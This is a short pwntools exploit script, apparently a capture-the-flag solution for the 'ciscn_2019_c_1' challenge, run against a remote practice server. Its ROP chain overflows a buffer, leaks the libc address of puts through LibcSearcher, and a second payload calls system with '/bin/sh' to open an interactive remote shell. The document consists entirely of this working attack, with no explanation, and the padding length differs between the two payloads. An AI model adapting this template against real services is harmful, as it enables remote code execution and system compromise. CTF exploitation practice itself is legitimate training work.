# coding=utf-8
from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'amd64'
#context.log_level = 'debug'

ru = lambda x:io.recvuntil(x)
rl = lambda :io.recvline()
sla = lambda x,y:io.sendlineafter(x, y)

#io = process('./ciscn_2019_c_1')
io = remote('node3.buuoj.cn', 25413)
elf = ELF('./ciscn_2019_c_1')

ret = 0x04006b9
pop_rdi = 0x0400c83
main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
start_addr = elf.sym['_start']
print("main_addr: ", hex(main_addr))
print("start_addr: ", hex(start_addr))
sla('choice!\n', '1')
payload = 'a' * 80 + 'jjkkjjkk'
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
sla('encrypted\n', payload)

rl()
rl()

puts_addr = u64(ru('\n').ljust(8,'\x00'))

libc = LibcSearcher('puts', puts_addr)
libc_addr = puts_addr - libc.dump('puts')
system_addr = libc_addr + libc.dump('system')
bin_sh_addr = libc_addr + libc.dump('str_bin_sh')

sla('choice!\n', '1')
payload1 = 'a' * 50 + 'jjkkjjkk'
payload1 += p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
sla('encrypted\n', payload1)

io.interactive()
